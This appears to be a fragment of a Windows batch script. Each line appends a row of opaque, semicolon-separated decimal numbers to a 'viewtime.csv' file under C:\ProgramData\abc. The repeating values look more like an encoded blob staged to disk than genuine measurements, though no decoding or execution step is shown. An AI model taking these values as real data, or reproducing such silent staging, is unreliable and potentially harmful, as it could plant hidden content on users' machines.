>> "C:\ProgramData\abc\viewtime.csv" echo(0870.436;48.372;137.484;8.0078;716.69;451.192;372.139;0107.484;36.732;72.841;
>> "C:\ProgramData\abc\viewtime.csv" echo(13.1165;802.23;40.0;372.139;5245.768;36.380;255.844;168.7537;30.0;50.72;
>> "C:\ProgramData\abc\viewtime.csv" echo(837.68;0086.736;40.772;139.376;36.6098;340.72;839.68;536.80;2047.955;144.876;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.40;0.7642;451.210;372.139;576.36;4915.540;72.839;68.736;80.8813;955.144;
>> "C:\ProgramData\abc\viewtime.csv" echo(884.0;60.0;7258.772;139.776;36.440;72.7179;839.68;336.80;955.144;4401.892;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.40;0.844;72.0824;831.196;372.195;904.204;4359.904;204.904;204.904;204.4368;
>> "C:\ProgramData\abc\viewtime.csv" echo(904.204;904.204;904.204;4957.372;137.676;36.68;87.9286;572.131;936.112;572.199;
>> "C:\ProgramData\abc\viewtime.csv" echo(8620.768;36.748;0.30;0.5231;30.72;884.0;50.253;2882.955;255.77;0.50;
>> "C:\ProgramData\abc\viewtime.csv" echo(72.1587;837.68;436.40;372.141;7017.668;36.556;72.839;248.8141;651.192;885.48;
>> "C:\ProgramData\abc\viewtime.csv" echo(30.0;1927.60;243.870;184.31;0.1883;30.0;672.105;892.66;7416.47;0.60;
>> "C:\ProgramData\abc\viewtime.csv" echo(72.839;140.4424;536.128;30.0;70.72;1256.53;65.38;72.839;208.9646;372.139;
>> "C:\ProgramData\abc\viewtime.csv" echo(840.36;828.0;0651.30;0.932;149.422;0.0785;50.144;899.68;536.32;5972.70;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.70;0.935;10.4934;839.68;536.32;955.192;8752.837;68.436;32.831;124.4749;
>> "C:\ProgramData\abc\viewtime.csv" echo(436.32;310.15;841.133;6003.30;0.60;184.71;0.3950;40.0;772.105;892.94;
>> "C:\ProgramData\abc\viewtime.csv" echo(7473.37;0.40;72.839;140.0742;436.128;60.0;30.72;4984.53;65.78;72.839;
>> "C:\ProgramData\abc\viewtime.csv" echo(208.5708;772.139;840.36;828.0;6129.70;0.932;77.422;0.7695;50.65;884.48;
>> "C:\ProgramData\abc\viewtime.csv" echo(30.0;5791.70;72.841;84.636;56.9955;472.139;576.36;740.72;9053.839;132.336;
>> "C:\ProgramData\abc\viewtime.csv" echo(128.60;0.2737;30.255;844.200;50.0;6929.30;129.824;36.488;0.3768;316.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(70.117;632.72;9601.839;68.336;40.372;185.5480;800.105;815.111;814.100;8403.801;
>> "C:\ProgramData\abc\viewtime.csv" echo(114.672;57.38;117.3747;312.72;839.68;736.40;6754.472;137.368;36.348;235.4300;
>> "C:\ProgramData\abc\viewtime.csv" echo(621.72;839.68;436.40;1116.372;45.60;0.51;0.9860;772.137;468.36;640.233;
>> "C:\ProgramData\abc\viewtime.csv" echo(4970.802;255.955;255.372;131.0090;824.36;348.0;816.70;8548.365;184.30;128.50;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.7978;551.210;472.139;676.36;4478.348;72.839;132.336;128.5198;40.0;60.255;
>> "C:\ProgramData\abc\viewtime.csv" echo(480.88;9766.884;1.50;0.70;72.7335;805.192;822.7;60.0;4191.472;139.840;
>> "C:\ProgramData\abc\viewtime.csv" echo(36.828;0.3504;60.0;372.3;765.8;6521.676;139.768;36.648;72.6712;839.208;
>> "C:\ProgramData\abc\viewtime.csv" echo(472.139;840.36;1600.828;0.50;0.932;163.8188;421.0;40.144;884.1;2436.60;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.70;72.805;192.7731;852.7;30.0;672.139;0163.840;36.828;0.30;0.7837;
>> "C:\ProgramData\abc\viewtime.csv" echo(372.3;465.8;572.139;7519.908;72.839;140.536;128.5803;50.0;30.232;822.21;
>> "C:\ProgramData\abc\viewtime.csv" echo(1706.40;0.844;72.831;196.3652;812.95;895.204;904.204;2193.772;137.676;36.68;
>> "C:\ProgramData\abc\viewtime.csv" echo(72.8304;831.236;572.72;899.68;6181.436;32.50;0.30;0.9762;672.184;30.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(953.255;5000.955;7.40;0.372;137.1081;368.36;640.72;831.124;1798.736;32.30;
>> "C:\ProgramData\abc\viewtime.csv" echo(117.553;65.1748;885.4;60.0;30.65;6245.884;0.748;0.30;186.2002;50.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(71.0;772.139;1598.676;36.540;72.839;68.7721;336.80;955.80;548.72;4203.837;
>> "C:\ProgramData\abc\viewtime.csv" echo(68.536;32.572;139.9576;368.36;540.72;645.0;9807.70;1.30;72.837;68.3090;
>> "C:\ProgramData\abc\viewtime.csv" echo(636.40;935.195;572.184;9504.800;105.815;111.814;100.0457;801.114;572.137;468.36;
>> "C:\ProgramData\abc\viewtime.csv" echo(3771.348;65.884;8.60;0.4793;40.72;841.84;436.48;0309.472;139.476;36.532;
>> "C:\ProgramData\abc\viewtime.csv" echo(232.6245;890.16;60.0;884.1;5000.60;0.60;72.807;192.1496;58.72;839.76;
>> "C:\ProgramData\abc\viewtime.csv" echo(536.32;5442.772;3.900;72.839;193.7173;765.184;58.0;50.0;2800.572;141.784;
>> "C:\ProgramData\abc\viewtime.csv" echo(36.480;72.5021;839.200;932.151;716.0;6589.50;72.839;68.536;32.1242;672.131;
>> "C:\ProgramData\abc\viewtime.csv" echo(896.72;895.204;8909.904;204.904;204.904;204.8087;904.204;904.204;904.204;8038.472;
>> "C:\ProgramData\abc\viewtime.csv" echo(137.476;36.78;72.8741;829.236;868.2;40.0;2389.899;68.336;44.51;0.4960;
>> "C:\ProgramData\abc\viewtime.csv" echo(40.0;572.139;840.36;2918.876;2.50;0.932;79.1185;420.0;60.255;900.137;
>> "C:\ProgramData\abc\viewtime.csv" echo(3501.832;36.844;2.50;0.0486;884.2;70.0;30.102;6940.837;68.636;48.884;
>> "C:\ProgramData\abc\viewtime.csv" echo(3.5161;30.0;40.102;837.68;9825.636;50.884;5.60;0.2011;60.102;837.68;
>> "C:\ProgramData\abc\viewtime.csv" echo(636.52;2115.884;7.50;0.30;102.6622;837.68;736.54;884.11;5836.70;0.50;
>> "C:\ProgramData\abc\viewtime.csv" echo(102.837;68.8993;336.56;884.13;60.0;6743.50;102.837;68.736;58.6822;884.17;
>> "C:\ProgramData\abc\viewtime.csv" echo(40.0;70.102;1318.837;68.336;60.884;19.7377;30.0;40.102;837.68;0039.536;
>> "C:\ProgramData\abc\viewtime.csv" echo(62.884;23.30;0.5115;40.102;837.68;336.64;7980.884;29.30;0.50;102.2164;
>> "C:\ProgramData\abc\viewtime.csv" echo(837.68;736.66;884.31;7096.60;0.70;102.837;68.8441;336.68;884.37;50.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(8699.40;102.837;68.636;70.3327;884.41;60.0;60.102;1594.837;68.536;72.884;
>> "C:\ProgramData\abc\viewtime.csv" echo(43.8894;50.0;60.102;837.68;4934.736;74.884;47.60;0.5751;30.102;837.68;
>> "C:\ProgramData\abc\viewtime.csv" echo(536.76;8197.884;53.70;0.60;102.2927;837.68;536.78;884.59;6401.30;0.70;
>> "C:\ProgramData\abc\viewtime.csv" echo(102.837;68.3638;336.80;884.61;30.0;6483.60;102.837;68.536;82.0312;884.67;
>> "C:\ProgramData\abc\viewtime.csv" echo(30.0;60.102;3303.837;68.436;84.884;71.2099;50.0;50.102;837.68;2877.436;
>> "C:\ProgramData\abc\viewtime.csv" echo(86.884;73.40;0.9859;70.102;837.68;436.88;6707.884;79.40;0.50;102.8822;
>> "C:\ProgramData\abc\viewtime.csv" echo(837.68;536.90;884.83;6725.40;0.70;102.837;68.7316;536.92;884.89;40.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(9784.40;102.837;68.736;94.6374;884.97;30.0;30.102;0894.837;68.736;96.884;
>> "C:\ProgramData\abc\viewtime.csv" echo(101.0480;70.0;50.102;837.68;1262.736;98.884;103.60;0.4672;70.102;837.68;
>> "C:\ProgramData\abc\viewtime.csv" echo(536.100;7016.884;107.60;0.60;102.2399;837.68;636.102;884.109;4626.60;0.60;
>> "C:\ProgramData\abc\viewtime.csv" echo(102.837;68.0090;436.104;884.113;40.0;4470.40;102.837;68.736;106.2428;884.127;
>> "C:\ProgramData\abc\viewtime.csv" echo(50.0;30.102;6957.837;68.336;108.884;131.6100;50.0;30.102;837.68;2798.736;
>> "C:\ProgramData\abc\viewtime.csv" echo(110.884;137.30;0.5301;30.102;837.68;336.112;7391.884;139.50;0.70;102.8240;
>> "C:\ProgramData\abc\viewtime.csv" echo(837.68;336.114;884.149;9733.70;0.60;102.837;68.1948;536.116;884.151;30.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(1263.50;102.837;68.336;118.4272;884.157;50.0;40.102;4643.837;68.736;120.884;
>> "C:\ProgramData\abc\viewtime.csv" echo(163.8007;70.0;30.102;837.68;6079.636;122.884;167.50;0.8420;50.102;837.68;
>> "C:\ProgramData\abc\viewtime.csv" echo(636.124;1890.884;173.30;0.30;102.1661;837.68;336.126;884.179;7867.40;0.30;
>> "C:\ProgramData\abc\viewtime.csv" echo(102.837;132.3545;336.128;30.0;30.184;9056.881;0.40;0.802;137.4332;832.36;
>> "C:\ProgramData\abc\viewtime.csv" echo(830.0;60.0;1782.884;191.60;0.70;102.4003;837.132;636.132;60.0;5851.60;
>> "C:\ProgramData\abc\viewtime.csv" echo(184.893;0.30;0.3053;802.137;832.36;834.0;9046.60;0.884;197.70;0.9291;
>> "C:\ProgramData\abc\viewtime.csv" echo(70.102;837.132;336.136;6971.60;0.30;184.899;0.4034;60.0;802.137;832.36;
>> "C:\ProgramData\abc\viewtime.csv" echo(1950.838;0.40;0.884;211.3364;70.0;70.102;837.132;2628.636;140.30;0.50;
>> "C:\ProgramData\abc\viewtime.csv" echo(184.5068;923.0;40.0;802.137;3960.832;36.842;0.50;0.7556;884.227;40.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(70.102;9566.837;132.536;144.70;0.1897;50.184;929.0;70.0;7253.802;137.832;
>> "C:\ProgramData\abc\viewtime.csv" echo(36.846;0.3260;60.0;884.233;40.0;6087.40;102.837;132.536;148.3715;70.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(40.184;939.0;9357.50;0.802;137.832;36.4088;850.0;70.0;884.241;2694.60;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.50;102.837;132.8826;736.152;60.0;40.184;9658.951;0.40;0.802;137.6797;
>> "C:\ProgramData\abc\viewtime.csv" echo(832.36;854.0;50.0;7033.884;1.31;0.40;102.1262;837.132;636.156;30.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(7209.50;184.67;1.30;0.5940;802.137;832.36;858.0;6571.60;0.884;13.71;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.6260;40.102;837.132;536.160;4316.40;0.50;184.415;1.5057;40.0;802.137;
>> "C:\ProgramData\abc\viewtime.csv" echo(832.36;7337.862;0.50;0.884;21.2511;51.0;30.102;837.132;2194.436;164.60;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.50;184.6966;325.1;30.0;802.137;7706.832;36.866;0.40;0.5768;884.27;
>> "C:\ProgramData\abc\viewtime.csv" echo(31.0;70.102;5288.837;132.536;168.50;0.3431;30.184;637.1;30.0;4826.802;
>> "C:\ProgramData\abc\viewtime.csv" echo(137.832;36.870;0.1049;60.0;884.51;61.0;2608.60;102.837;132.336;172.6975;
>> "C:\ProgramData\abc\viewtime.csv" echo(70.0;70.184;555.1;5152.40;0.802;137.832;36.4944;874.0;30.0;884.57;
>> "C:\ProgramData\abc\viewtime.csv" echo(2758.31;0.70;102.837;132.3899;736.176;70.0;50.184;1105.361;1.50;0.802;
>> "C:\ProgramData\abc\viewtime.csv" echo(137.4744;832.36;878.0;70.0;9479.884;75.71;0.40;102.6820;837.132;336.180;
>> "C:\ProgramData\abc\viewtime.csv" echo(50.0;5857.50;184.581;1.50;0.3662;802.137;832.36;882.0;4295.30;0.884;
>> "C:\ProgramData\abc\viewtime.csv" echo(91.41;0.3837;30.102;837.132;636.184;8339.50;0.30;184.693;1.5448;60.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(802.137;832.36;1563.886;0.60;0.884;97.0296;41.0;30.102;837.132;2475.436;
>> "C:\ProgramData\abc\viewtime.csv" echo(188.70;0.70;184.3613;803.1;30.0;802.137;7172.832;36.890;0.40;0.8643;
>> "C:\ProgramData\abc\viewtime.csv" echo(884.111;41.0;40.102;7042.837;132.636;192.70;0.5304;30.184;817.1;70.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(9939.802;137.832;36.894;0.9866;70.0;884.123;71.0;3369.40;102.837;132.336;
>> "C:\ProgramData\abc\viewtime.csv" echo(196.4048;60.0;30.184;827.1;7370.70;0.802;137.832;36.1202;898.0;60.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(884.133;8250.51;0.60;102.837;132.5055;736.200;70.0;30.184;2233.841;1.60;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.802;137.3694;832.36;902.0;60.0;4388.884;145.51;0.30;102.2719;837.132;
>> "C:\ProgramData\abc\viewtime.csv" echo(636.204;60.0;8317.40;184.853;1.60;0.4023;802.137;832.36;906.0;1219.30;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.884;163.71;0.2673;50.102;837.132;636.208;6175.70;0.30;184.865;1.0058;
>> "C:\ProgramData\abc\viewtime.csv" echo(30.0;802.137;832.36;7325.910;0.60;0.884;175.0616;61.0;30.102;837.132;
>> "C:\ProgramData\abc\viewtime.csv" echo(3410.436;212.70;0.50;184.6970;877.1;70.0;802.137;4393.832;36.914;0.50;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.9864;884.183;51.0;60.102;9690.837;132.336;216.30;0.2033;30.184;887.1;
>> "C:\ProgramData\abc\viewtime.csv" echo(50.0;6402.802;137.832;36.918;0.8603;40.0;884.193;71.0;0956.30;102.837;
>> "C:\ProgramData\abc\viewtime.csv" echo(132.536;220.3689;50.0;70.184;901.1;8284.40;0.802;137.832;36.7028;922.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(30.0;884.205;4084.51;0.60;102.837;132.5971;436.224;70.0;30.184;2257.907;
>> "C:\ProgramData\abc\viewtime.csv" echo(1.40;0.802;137.8538;832.36;926.0;60.0;9220.884;211.31;0.50;102.4239;
>> "C:\ProgramData\abc\viewtime.csv" echo(837.132;436.228;70.0;3270.60;184.923;1.40;0.9936;802.137;832.36;930.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(3069.50;0.884;231.31;0.4432;50.102;837.132;736.232;5663.30;0.60;184.935;
>> "C:\ProgramData\abc\viewtime.csv" echo(1.9033;70.0;802.137;832.36;6444.934;0.40;0.884;243.9861;71.0;40.102;
>> "C:\ProgramData\abc\viewtime.csv" echo(837.132;0362.336;236.70;0.60;184.0341;947.1;40.0;802.137;4050.832;36.938;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.30;0.4395;884.253;31.0;50.102;5504.837;132.736;240.70;0.7630;30.184;
>> "C:\ProgramData\abc\viewtime.csv" echo(69.2;50.0;2777.802;137.832;36.942;0.2443;40.0;884.11;62.0;6420.70;
>> "C:\ProgramData\abc\viewtime.csv" echo(102.837;132.536;244.6091;40.0;70.184;529.2;9559.60;0.802;137.832;36.0845;
>> "C:\ProgramData\abc\viewtime.csv" echo(946.0;70.0;884.35;8811.72;0.60;102.837;132.0670;636.248;60.0;40.184;
>> "C:\ProgramData\abc\viewtime.csv" echo(4935.745;2.50;0.802;137.5552;832.36;950.0;60.0;4472.884;51.62;0.40;
>> "C:\ProgramData\abc\viewtime.csv" echo(102.0541;837.132;636.252;60.0;0738.70;184.757;2.60;0.6299;802.137;832.36;
>> "C:\ProgramData\abc\viewtime.csv" echo(954.0;4749.40;0.884;59.42;0.6050;40.102;837.132;336.0;2933.61;0.40;
>> "C:\ProgramData\abc\viewtime.csv" echo(184.765;2.7684;50.0;802.137;832.36;7579.62;1.30;0.884;75.4815;62.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(50.102;837.132;0833.736;4.31;0.50;184.9254;481.2;70.0;802.137;4995.832;
>> "C:\ProgramData\abc\viewtime.csv" echo(36.56;1.60;0.6305;884.87;32.0;60.102;1431.837;132.436;8.51;0.8068;
>> "C:\ProgramData\abc\viewtime.csv" echo(30.184;689.2;30.0;8585.802;137.832;36.510;1.1715;40.0;884.95;32.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(6451.60;102.837;132.736;12.3796;51.0;70.184;801.2;9345.70;0.802;137.832;
>> "C:\ProgramData\abc\viewtime.csv" echo(36.6499;314.1;50.0;884.105;3251.32;0.70;102.837;132.6944;736.16;51.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(50.184;7553.807;2.60;0.802;137.9465;832.36;618.1;60.0;1369.884;119.32;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.30;102.0991;837.132;736.20;41.0;6069.40;184.829;2.40;0.2227;802.137;
>> "C:\ProgramData\abc\viewtime.csv" echo(832.36;422.1;0357.30;0.884;131.42;0.7620;50.102;837.132;336.24;5722.71;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.30;184.835;2.8545;40.0;802.137;832.36;8016.426;1.30;0.884;141.6959;
>> "C:\ProgramData\abc\viewtime.csv" echo(32.0;40.102;837.132;1491.336;28.71;0.30;184.9218;847.2;60.0;802.137;
>> "C:\ProgramData\abc\viewtime.csv" echo(5321.832;36.630;1.40;0.6827;884.149;42.0;40.102;9048.837;132.336;32.41;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.4468;50.184;861.2;50.0;9733.802;137.832;36.734;1.5260;70.0;884.165;
>> "C:\ProgramData\abc\viewtime.csv" echo(62.0;1814.70;102.837;132.436;36.6097;61.0;60.184;871.2;7136.50;0.802;
>> "C:\ProgramData\abc\viewtime.csv" echo(137.832;36.1855;338.1;30.0;884.179;9275.32;0.50;102.837;132.7838;536.40;
>> "C:\ProgramData\abc\viewtime.csv" echo(51.0;50.184;8025.889;2.70;0.802;137.1070;832.36;642.1;40.0;6580.884;
>> "C:\ProgramData\abc\viewtime.csv" echo(197.32;0.40;102.3694;837.132;536.44;31.0;1819.30;184.907;2.40;0.7073;
>> "C:\ProgramData\abc\viewtime.csv" echo(802.137;832.36;446.1;4916.70;0.884;215.62;0.8092;40.102;837.132;736.48;
>> "C:\ProgramData\abc\viewtime.csv" echo(7633.71;0.70;184.921;2.4112;70.0;802.137;832.36;9889.750;1.30;0.884;
>> "C:\ProgramData\abc\viewtime.csv" echo(227.9411;52.0;70.102;837.132;9246.336;52.51;0.40;184.5209;931.2;70.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(802.137;7173.832;36.554;1.50;0.5206;884.239;62.0;30.102;0600.837;132.636;
>> "C:\ProgramData\abc\viewtime.csv" echo(56.41;0.0163;60.184;945.2;50.0;4725.802;137.832;36.658;1.6694;30.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(884.249;62.0;4554.30;102.837;132.336;60.0544;41.0;70.184;71.3;5630.70;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.802;137.832;36.0223;562.1;40.0;884.5;9969.43;0.30;102.837;132.3623;
>> "C:\ProgramData\abc\viewtime.csv" echo(436.64;31.0;30.184;3266.719;3.50;0.802;137.4908;832.36;466.1;70.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(7711.884;29.43;0.40;102.7371;837.132;336.68;61.0;8810.30;184.441;3.60;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.5233;802.137;832.36;670.1;6679.40;0.884;43.73;0.3453;50.102;837.132;
>> "C:\ProgramData\abc\viewtime.csv" echo(436.72;0007.51;0.30;184.353;3.7685;40.0;802.137;832.36;2232.574;1.50;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.884;55.6840;63.0;60.102;837.132;2588.736;76.51;0.70;184.0466;359.3;
>> "C:\ProgramData\abc\viewtime.csv" echo(50.0;802.137;7714.832;36.478;1.30;0.9201;884.61;63.0;60.102;2378.837;
>> "C:\ProgramData\abc\viewtime.csv" echo(132.436;80.71;0.8247;50.184;571.3;30.0;4236.802;137.832;36.582;1.0953;
>> "C:\ProgramData\abc\viewtime.csv" echo(50.0;884.85;33.0;3562.40;102.837;132.536;84.7866;31.0;40.184;789.3;
>> "C:\ProgramData\abc\viewtime.csv" echo(5296.50;0.802;137.832;36.1313;586.1;60.0;884.91;9275.43;0.70;102.837;
>> "C:\ProgramData\abc\viewtime.csv" echo(132.5629;536.88;51.0;50.184;1757.595;3.50;0.802;137.5221;832.36;690.1;
>> "C:\ProgramData\abc\viewtime.csv" echo(30.0;7325.884;109.33;0.30;102.6372;837.132;636.92;41.0;3032.60;184.813;
>> "C:\ProgramData\abc\viewtime.csv" echo(3.50;0.7201;802.137;832.36;694.1;4865.40;0.884;115.53;0.3427;60.102;
>> "C:\ProgramData\abc\viewtime.csv" echo(837.132;336.96;9256.61;0.40;184.819;3.3819;30.0;802.137;832.36;8990.598;
>> "C:\ProgramData\abc\viewtime.csv" echo(1.50;0.884;139.1249;63.0;30.102;837.132;5800.436;100.41;0.40;184.8881;
>> "C:\ProgramData\abc\viewtime.csv" echo(843.3;50.0;802.137;9432.832;36.802;1.50;0.0289;884.151;73.0;30.102;
>> "C:\ProgramData\abc\viewtime.csv" echo(5578.837;132.636;104.61;0.0109;60.184;861.3;30.0;8051.802;137.832;36.806;
>> "C:\ProgramData\abc\viewtime.csv" echo(1.4528;60.0;884.169;33.0;4158.30;102.837;132.736;108.3727;61.0;40.184;
>> "C:\ProgramData\abc\viewtime.csv" echo(873.3;3424.50;0.802;137.832;36.0985;810.1;50.0;884.179;0322.43;0.40;
>> "C:\ProgramData\abc\viewtime.csv" echo(102.837;132.3798;336.112;51.0;40.184;1416.885;3.50;0.802;137.8693;832.36;
>> "C:\ProgramData\abc\viewtime.csv" echo(814.1;70.0;2885.884;199.73;0.60;102.9016;837.132;336.116;31.0;3810.30;
>> "C:\ProgramData\abc\viewtime.csv" echo(184.903;3.60;0.5584;802.137;832.36;818.1;9296.70;0.884;209.43;0.4371;
>> "C:\ProgramData\abc\viewtime.csv" echo(50.102;837.132;436.120;4347.61;0.50;184.915;3.6186;40.0;802.137;832.36;
>> "C:\ProgramData\abc\viewtime.csv" echo(2926.822;1.60;0.884;223.3510;53.0;70.102;837.132;4853.336;124.61;0.40;
>> "C:\ProgramData\abc\viewtime.csv" echo(184.3484;929.3;50.0;802.137;8356.832;36.826;1.60;0.3221;884.241;33.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(60.102;8833.837;132.636;128.31;0.0338;30.184;945.3;50.0;7890.802;137.832;
>> "C:\ProgramData\abc\viewtime.csv" echo(36.830;1.5208;30.0;884.251;53.0;1852.40;102.837;132.536;132.4342;41.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(30.184;953.3;9693.60;0.802;137.832;36.4024;834.1;60.0;884.7;7146.64;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.70;102.837;132.1198;636.136;31.0;60.184;0621.49;4.60;0.802;137.2486;
>> "C:\ProgramData\abc\viewtime.csv" echo(832.36;838.1;60.0;8258.884;15.64;0.60;102.8728;837.132;636.140;41.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(7581.70;184.725;4.60;0.4349;802.137;832.36;842.1;3611.30;0.884;27.54;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.4711;40.102;837.132;636.144;8239.51;0.60;184.637;4.1679;70.0;802.137;
>> "C:\ProgramData\abc\viewtime.csv" echo(832.36;7823.846;1.70;0.884;39.7778;34.0;50.102;837.132;0134.536;148.61;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.30;184.9279;745.4;30.0;802.137;7311.832;36.850;1.40;0.8998;884.63;
>> "C:\ProgramData\abc\viewtime.csv" echo(44.0;70.102;5695.837;132.736;152.31;0.4658;50.184;367.4;50.0;0445.802;
>> "C:\ProgramData\abc\viewtime.csv" echo(137.832;36.854;1.7736;60.0;884.69;74.0;3091.70;102.837;132.636;156.4090;
>> "C:\ProgramData\abc\viewtime.csv" echo(61.0;50.184;473.4;1584.60;0.802;137.832;36.5345;858.1;60.0;884.79;
>> "C:\ProgramData\abc\viewtime.csv" echo(3605.34;0.50;102.837;132.2285;636.160;61.0;50.184;4835.485;4.30;0.802;
>> "C:\ProgramData\abc\viewtime.csv" echo(137.9515;832.36;862.1;50.0;7324.884;93.74;0.30;102.0302;837.132;436.164;
>> "C:\ProgramData\abc\viewtime.csv" echo(41.0;8813.50;184.699;4.40;0.6625;802.137;832.36;866.1;8911.40;0.884;
>> "C:\ProgramData\abc\viewtime.csv" echo(105.54;0.4724;60.102;837.132;636.168;6297.71;0.30;184.827;4.7360;70.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(802.137;832.36;4308.870;1.50;0.884;129.8167;74.0;40.102;837.132;4316.436;
>> "C:\ProgramData\abc\viewtime.csv" echo(172.31;0.60;184.1002;839.4;60.0;802.137;7807.832;36.874;1.30;0.5068;
>> "C:\ProgramData\abc\viewtime.csv" echo(884.147;74.0;70.102;7270.837;132.536;176.61;0.6514;40.184;857.4;60.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(1368.802;137.832;36.878;1.9935;30.0;884.163;54.0;7045.50;102.837;132.636;
>> "C:\ProgramData\abc\viewtime.csv" echo(180.7606;51.0;70.184;869.4;6365.30;0.802;137.832;36.7572;882.1;30.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(884.177;3599.74;0.30;102.837;132.4951;636.184;71.0;70.184;1604.889;4.50;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.802;137.0219;832.36;886.1;30.0;0631.884;193.44;0.50;102.7381;837.132;
>> "C:\ProgramData\abc\viewtime.csv" echo(536.188;71.0;9538.70;184.899;4.70;0.6810;802.137;832.36;890.1;9844.30;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.884;205.64;0.8614;70.102;837.132;536.192;1133.51;0.50;184.907;4.7689;
>> "C:\ProgramData\abc\viewtime.csv" echo(30.0;802.137;832.36;9427.894;1.40;0.884;213.0901;34.0;70.102;837.132;
>> "C:\ProgramData\abc\viewtime.csv" echo(6373.636;196.31;0.70;184.7676;925.4;40.0;802.137;6570.832;36.898;1.50;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.3452;884.235;44.0;50.102;0960.837;132.336;200.41;0.4699;70.184;953.4;
>> "C:\ProgramData\abc\viewtime.csv" echo(30.0;9619.802;137.832;36.902;1.2843;70.0;884.255;34.0;4293.70;102.837;
>> "C:\ProgramData\abc\viewtime.csv" echo(132.736;204.2142;61.0;60.184;63.5;4200.30;0.802;137.832;36.7750;906.1;
>> "C:\ProgramData\abc\viewtime.csv" echo(60.0;884.9;8411.45;0.50;102.837;132.2034;636.208;41.0;50.184;0186.711;
>> "C:\ProgramData\abc\viewtime.csv" echo(5.30;0.802;137.6571;832.36;910.1;30.0;8147.884;17.35;0.50;102.1931;
>> "C:\ProgramData\abc\viewtime.csv" echo(837.132;536.212;41.0;2953.60;184.521;5.30;0.4968;802.137;832.36;914.1;
>> "C:\ProgramData\abc\viewtime.csv" echo(8334.40;0.884;23.65;0.7966;50.102;837.132;336.216;3078.71;0.50;184.427;
>> "C:\ProgramData\abc\viewtime.csv" echo(5.4373;70.0;802.137;832.36;3425.918;1.40;0.884;39.8138;75.0;30.102;
>> "C:\ProgramData\abc\viewtime.csv" echo(837.132;2092.636;220.41;0.50;184.3415;741.5;30.0;802.137;8844.832;36.922;
>> "C:\ProgramData\abc\viewtime.csv" echo(1.50;0.2596;884.47;45.0;40.102;6438.837;132.736;224.31;0.1833;30.184;
>> "C:\ProgramData\abc\viewtime.csv" echo(381.5;70.0;2610.802;137.832;36.926;1.5544;60.0;884.87;75.0;3814.70;
>> "C:\ProgramData\abc\viewtime.csv" echo(102.837;132.336;228.7597;51.0;60.184;493.5;5281.50;0.802;137.832;36.4377;
>> "C:\ProgramData\abc\viewtime.csv" echo(930.1;50.0;884.101;4177.35;0.50;102.837;132.5970;736.232;41.0;30.184;
>> "C:\ProgramData\abc\viewtime.csv" echo(9683.819;5.50;0.802;137.4110;832.36;934.1;50.0;6778.884;129.65;0.60;
>> "C:\ProgramData\abc\viewtime.csv" echo(102.4704;837.132;736.236;41.0;4200.60;184.843;5.30;0.8786;802.137;832.36;
>> "C:\ProgramData\abc\viewtime.csv" echo(938.1;1812.50;0.884;147.55;0.2145;60.102;837.132;736.240;7274.51;0.60;
>> "C:\ProgramData\abc\viewtime.csv" echo(184.849;5.7954;40.0;802.137;832.36;6374.942;1.70;0.884;153.4972;35.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(50.102;837.132;3286.436;244.71;0.30;184.3096;859.5;30.0;802.137;8226.832;
>> "C:\ProgramData\abc\viewtime.csv" echo(36.946;1.30;0.2119;884.167;35.0;30.102;2910.837;132.336;248.61;0.8878;
>> "C:\ProgramData\abc\viewtime.csv" echo(40.184;871.5;70.0;4121.802;137.832;36.950;1.1713;60.0;884.173;35.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(9802.60;102.837;132.436;252.2275;31.0;70.184;879.5;4843.50;0.802;137.832;
>> "C:\ProgramData\abc\viewtime.csv" echo(36.7117;954.1;40.0;884.191;3481.65;0.40;102.837;132.5719;436.0;62.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(40.184;3968.901;5.40;0.802;137.5022;832.36;52.2;40.0;6890.884;203.45;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.30;102.3276;837.132;636.4;62.0;6646.60;184.907;5.30;0.4172;802.137;
